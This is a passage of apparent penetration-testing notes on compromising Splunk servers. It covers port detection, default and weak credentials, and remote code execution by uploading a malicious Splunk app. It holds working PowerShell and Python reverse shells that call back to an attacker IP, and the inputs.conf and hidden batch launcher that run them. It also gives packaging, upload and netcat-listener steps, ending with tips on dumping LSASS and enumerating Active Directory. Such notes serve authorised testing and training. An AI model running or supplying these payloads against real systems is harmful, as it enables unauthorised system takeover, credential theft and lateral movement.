  * Port `8000` (Web UI)
  * Port `8089` (Management/REST API)
* Can be detected with:

  ```bash
  sudo nmap -sV <target-ip>
  ```

  Example Output:

  ```
  8000/tcp open  ssl/http  Splunkd httpd
  8089/tcp open  ssl/http  Splunkd httpd
  ```

### 🕵️ Enumeration Insights

* **Trial versions** downgrade to **Free** mode after 60 days → no auth required.
* **Default Credentials** (older versions): `admin:changeme`
* If default fails, try weak passwords:

  * `admin`, `Welcome1`, `Password123`, etc.

### 🧪 Abuse & RCE Possibilities

* If access is gained:

  * Browse indexed data
  * Install apps from Splunkbase
  * Create **scripted inputs** (common RCE path)

    * Bash, PowerShell, Batch, or Python scripts supported
    * Run reverse shells via scripted input

* **Python always available** on Splunk installations

* **Scripted Input Path**:

  * Installed as part of Splunk's modular inputs
  * Runs code and feeds `stdout` as log data

---

# 🛠️ Attacking Splunk via Custom Applications

## 🎯 Objective

Leverage Splunk’s app deployment system to achieve **Remote Code Execution (RCE)** using built-in scripting capabilities such as **Python** or **PowerShell**.

## 🧰 Key Splunk Directory Structure

```
splunk_shell/
├── bin              # Contains scripts (PowerShell, Python, etc.)
└── default          # Contains configuration file (inputs.conf)
```

## 📜 PowerShell Reverse Shell Example

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
  $sendback = (iex $data 2>&1 | Out-String );
  $sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush()
};
$client.Close()
```

## ⚙️ `inputs.conf` Configuration

```ini
[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```

## 🖥️ Batch File: `run.bat`

```bat
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```

## 🧪 Python Reverse Shell (For Linux Targets)

```python
import sys, socket, os, pty

ip = "10.10.14.15"
port = "443"
s = socket.socket()
s.connect((ip, int(port)))
[os.dup2(s.fileno(), fd) for fd in (0,1,2)]
pty.spawn("/bin/bash")
```

## 📦 Packaging the App

```bash
tar -cvzf updater.tar.gz splunk_shell/
```

we created a folder of all the files above and zipped it

## 🚀 Upload the App

Go to:

```
https://<splunk-host>:8000/en-US/manager/search/apps/local
```

* Click: `Install app from file`
* Browse and upload `updater.tar.gz`
* App auto-enables, triggering reverse shell

## 🧏 Listener Setup

```bash
sudo nc -lnvp 443
```

Expected output upon successful connection:

```powershell
PS C:\Windows\system32> whoami
nt authority\system
```

## 🧱 Persistence and Lateral Movement

* If the target is a **deployment server**, place your app in:

  ```
  $SPLUNK_HOME/etc/deployment-apps/
  ```
* Forwarders (especially Windows-based) **do not include Python**, so use **PowerShell** payloads for those.


## 🔐 Post-Exploitation Tips

* Enumerate registry, filesystem, memory for credentials
* Dump LSASS for password hashes
* Begin Active Directory enumeration

---

